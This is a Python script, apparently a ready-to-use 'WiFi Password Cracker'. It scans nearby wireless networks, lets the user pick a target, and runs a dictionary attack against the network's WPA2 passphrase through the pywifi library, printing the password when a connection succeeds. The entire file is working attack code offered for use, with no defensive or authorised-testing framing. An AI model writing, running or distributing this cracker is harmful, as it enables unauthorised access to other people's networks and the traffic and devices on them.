import pywifi
import time
from pywifi import const

# WiFi scanner
def wifi_scan():
    wifi = pywifi.PyWiFi()  # Initialize WiFi
    interface = wifi.interfaces()[0]  # Use the first interface
    interface.scan()  # Start scanning
    for i in range(4):
        time.sleep(1)
        print('\rScanning WiFi, please wait... (' + str(3 - i) + ')', end='')
    print('\rScan Completed!\n' + '-' * 38)
    print('{:4}{:6}{}'.format('No.', 'Strength', 'WiFi Name'))
    
    bss = interface.scan_results()  # Scan result
    
    wifi_name_set = set()
    for w in bss:
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    
    num = 0
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    
    return wifi_name_list

# WiFi cracking function
def wifi_password_crack(wifi_name):
    wifi_dic_path = input("Please provide the path to the password dictionary file: ")
    
    with open(wifi_dic_path, 'r') as f:
        for pwd in f:
            pwd = pwd.strip('\n')
            wifi = pywifi.PyWiFi()
            interface = wifi.interfaces()[0]
            interface.disconnect()
            while interface.status() == 4:
                pass
            profile = pywifi.Profile()
            profile.ssid = wifi_name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd
            interface.remove_all_network_profiles()
            tmp_profile = interface.add_network_profile(profile)

            try:
            
                interface.connect(tmp_profile)
                start_time = time.time()
                while time.time() - start_time < 10:
                    if interface.status() == 4:
                        print(f'\rConnection Succeeded! Password: {pwd}')
                        exit(0)
                    else:
                        print(f'\rTrying with {pwd}', end='')
            except Exception as e:
                print(f'\rError during connection attempt: {e}')

def main():
    exit_flag = 0
    target_num = -1
    
    while not exit_flag:
        try:
            print('WiFi Password Cracker'.center(38, '-'))
            wifi_list = wifi_scan()
            
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('Please choose a target WiFi: '))
                    if target_num in range(len(wifi_list)):
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'The chosen target WiFi is: {wifi_list[target_num][1]}. Sure? (Y/N)'))
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                else:
                                    print('Please enter only Y or N.')
                            except ValueError:
                                print('Please enter only Y or N.')
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('Please choose a target WiFi: ')
                except ValueError:
                    print('Please enter a valid number.')
            
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e

if __name__ == '__main__':
    main()
